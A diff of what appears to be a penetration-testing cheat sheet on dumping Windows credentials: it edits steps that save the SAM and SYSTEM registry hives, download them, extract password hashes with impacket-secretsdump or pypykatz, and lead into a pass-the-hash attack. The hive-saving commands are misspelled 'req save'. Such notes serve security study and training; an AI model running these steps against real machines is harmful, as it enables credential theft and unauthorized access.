@@ -6,9 +6,19 @@
 
 #### 1: Backup SAM and SYSTEM hashes
 
-#### req save hklm\system c:\users\user\system.hive
+#### cd /
 
-#### req save hklm\sam c:\users\user\sam.hive
+#### mkdir temp
+
+#### cd temp
+
+#### req save hklm\system c:\temp\system
+
+#### req save hklm\sam c:\temp\sam
+
+#### download sam
+
+#### download system
 
 #### 2: Create SMB Server on attacking machine
 
@@ -24,7 +34,11 @@
 
 #### 4: Retrieve hashes
 
-#### python3 impacket-secretsdump.py -sam sam.hive -system system.hive LOCAL
+ - impacket-secretsdump -sam sam.hive -system system.hive LOCAL
+
+## OR 
+
+ - pypykatz registry --sam sam system
 
 #### 5: Pass-The-Hash Attack (PtH)
 
